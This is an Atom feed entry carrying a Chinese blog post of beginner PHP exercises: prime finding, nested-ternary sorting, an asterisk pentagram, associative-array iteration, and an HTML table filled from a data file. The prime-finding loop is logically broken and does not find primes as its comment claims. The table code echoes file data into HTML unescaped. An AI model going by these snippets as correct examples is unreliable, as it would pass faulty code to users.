    <content type="html"><![CDATA[<p>这个<a id="more"></a></p><h1 id="素数查找"><a href="#素数查找" class="headerlink" title="素数查找"></a>素数查找</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 素数:只能被1和自身整除</span><br><span class="line">for($i=1;$i&lt;100;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    for($j=1;$j&lt;$i;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(($i%$j)==0)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            continue; //不是继续查找</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三元排大小"><a href="#三元排大小" class="headerlink" title="三元排大小"></a>三元排大小</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">($a==$b&amp;&amp;$b==$c)?(</span><br><span class="line">    print &quot;$a=$b=$c&quot;</span><br><span class="line">):(</span><br><span class="line">    ($a==$b)?(</span><br><span class="line">        ($a&gt;$c)?(</span><br><span class="line">            print &quot;$a=$b&gt;$c&quot;</span><br><span class="line">        ):(</span><br><span class="line">            print &quot;$c&gt;$a=$b&quot;</span><br><span class="line">        )</span><br><span class="line">    ):(</span><br><span class="line">        ($a==$c)?(</span><br><span class="line">            ($a&gt;$b)?(</span><br><span class="line">                print &quot;$a=$c&gt;$b&quot;</span><br><span class="line">            ):(</span><br><span class="line">                print &quot;$b&gt;$a=$c&quot;</span><br><span class="line">            )</span><br><span class="line">        ):(</span><br><span class="line">        ($b==$c)?(</span><br><span class="line">            ($a&gt;$b)?(</span><br><span class="line">                print &quot;$a&gt;$b=$c&quot;</span><br><span class="line">            ):(</span><br><span class="line">                print &quot;$b=$c&gt;$a&quot;</span><br><span class="line">            )</span><br><span class="line">            ):(</span><br><span class="line">                ($a&gt;$b)? (($a&gt;$c)? (($c&gt;$b)? (print &quot;$a&gt;$c&gt;$b&quot;):(print &quot;$a&gt;$b&gt;$c&quot;)):(print &quot;$c&gt;$a&gt;$b&quot;)):(($b&gt;$c)? (($a&gt;$c)? (print &quot;$b&gt;$a&gt;$c&quot;):(print &quot;$b&gt;$c&gt;$a&quot;)):(print &quot;$c&gt;$b&gt;$a&quot;))</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="五角星"><a href="#五角星" class="headerlink" title="五角星"></a>五角星</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">for($i1=1;$i1&lt;7;$i1++)             /*这是五角星的上面一个角*/</span><br><span class="line">      &#123;</span><br><span class="line">          for($j1=1;$j1&lt;19-$i1;$j1++)     /*这是空格*/</span><br><span class="line">              printf(&quot; &quot;);</span><br><span class="line">          for($k1=1;$k1&lt;=2*$i1-1;$k1++)   /*这是“*”*/</span><br><span class="line">              printf(&quot;*&quot;);</span><br><span class="line">          printf(&quot;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      for($i2=1;$i2&lt;5;$i2++)     /*这是五角星的中间两个角*/</span><br><span class="line">      &#123;</span><br><span class="line">          for($j2=1;$j2&lt;3*$i2-3;$j2++)</span><br><span class="line">              printf(&quot; &quot;);</span><br><span class="line">          for($k2=1;$k2&lt;=42-6*$i2;$k2++)</span><br><span class="line">              printf(&quot;*&quot;);</span><br><span class="line">          printf(&quot;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      for($i3=1;$i3&lt;3;$i3++)        //这是中间与下部相接的部分</span><br><span class="line">      &#123;</span><br><span class="line">          for($j3=1;$j3&lt;12-$i3;$j3++)</span><br><span class="line">              printf(&quot; &quot;);</span><br><span class="line">          for($k3=1;$k3&lt;=12+2*$i3;$k3++)</span><br><span class="line">              printf(&quot;*&quot;);</span><br><span class="line">          printf(&quot;\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">              for($i4=1;$i4&lt;5;$i4++)         // 这是五角星的下面两个角</span><br><span class="line">              &#123;</span><br><span class="line">                  for($j4=1;$j4&lt;10-$i4;$j4++)</span><br><span class="line">                      printf(&quot; &quot;);</span><br><span class="line">                  for($k4=1;$k4&lt;=10-2*$i4;$k4++)</span><br><span class="line">                      printf(&quot;*&quot;);</span><br><span class="line">                  for($m4=1;$m4&lt;6*$i4-3;$m4++)</span><br><span class="line">                      printf(&quot; &quot;);</span><br><span class="line">                  for($n4=1;$n4&lt;=10-2*$i4;$n4++)</span><br><span class="line">                      printf(&quot;*&quot;);</span><br><span class="line">                  printf(&quot;\n&quot;);</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/PHP代码练习/20190807055324467.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h1 id="for循环实现关联数组的遍历"><a href="#for循环实现关联数组的遍历" class="headerlink" title="for循环实现关联数组的遍历"></a>for循环实现关联数组的遍历</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$arr=[&apos;q&apos;=&gt;&apos;12&apos;,&apos;w&apos;=&gt;&apos;13&apos;,&apos;e&apos;=&gt;&apos;14&apos;,&apos;r&apos;=&gt;&quot;15&quot;];</span><br><span class="line">$num=count($arr);</span><br><span class="line">for($i=0;$i&lt;$num;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    echo key($arr).&quot;=&gt;&quot;.current($arr).&quot;\n&quot;;</span><br><span class="line">    next($arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="通过文件读写对HTML表格的操作"><a href="#通过文件读写对HTML表格的操作" class="headerlink" title="通过文件读写对HTML表格的操作"></a>通过文件读写对HTML表格的操作</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;  &gt;</span><br><span class="line">    &lt;title&gt;news&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body background=&quot;img/2.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;table border=&quot;1&quot; width=&quot;100%&quot; cellspacing=&quot;10&quot; cellpadding=&quot;10&quot; align=&quot;center &quot; bgcolor=&quot;#6495ed&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th id=&quot;pm&quot;&gt;排名&lt;/th&gt;</span><br><span class="line">            &lt;th id=&quot;mz&quot;&gt;名字&lt;/th&gt;</span><br><span class="line">            &lt;th id=&quot;jj&quot;  bgcolor=&quot;#a52a2a&quot;&gt;简介&lt;/th&gt;</span><br><span class="line">            &lt;th id=&quot;ss&quot;&gt;搜索指数&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            // 打开数据文件</span><br><span class="line">            $file=fopen(&quot;/Project/PHP/news/data/new.db&quot;,&quot;r&quot;);</span><br><span class="line"></span><br><span class="line">            if($file==null)</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;文件打开失败&quot;;</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $str=fgets($file);  // 去掉表格标题</span><br><span class="line">            $i=0;</span><br><span class="line">            while(!feof($file))</span><br><span class="line">            &#123;</span><br><span class="line">                $str=fgets($file);</span><br><span class="line">                $data=explode(&apos;||&apos;,$str);// 获取字符串按 || 分割成数组</span><br><span class="line">                if($i&lt;3)</span><br><span class="line">                &#123;</span><br><span class="line">                    // 前三行调用图片和简介</span><br><span class="line"></span><br><span class="line">                    table_qiansan($data);</span><br><span class="line">                &#125;</span><br><span class="line">                else&#123;</span><br><span class="line"></span><br><span class="line">                    table_fun($data);// 调用自定义函数</span><br><span class="line">                &#125;</span><br><span class="line">                $i++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fclose($file);</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// 三行前的信息读取</span><br><span class="line">// 分别显示 id 图片 简介</span><br><span class="line">function table_qiansan($data)</span><br><span class="line">&#123;</span><br><span class="line">    $data[2]=substr( $data[2],0,200);</span><br><span class="line">    echo &lt;&lt;&lt;EOF</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;$data[0]&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;img src=&quot;img/1.jpg&quot;&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td colspan=&quot;2&quot;&gt;$data[2]&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 三行后的信息</span><br><span class="line">function table_fun($data)</span><br><span class="line">&#123;</span><br><span class="line">  echo &lt;&lt;&lt;EOF</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td&gt;$data[0]&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;$data[1]&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;$data[2]&lt;/td&gt;</span><br><span class="line">    &lt;td&gt;$data[3]&lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;;</span><br><span class="line">EOF;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>效果图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/PHP代码练习/20190807083753363.png" alt title>                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个
    
    </summary>
    
    
  </entry>
  
</feed>
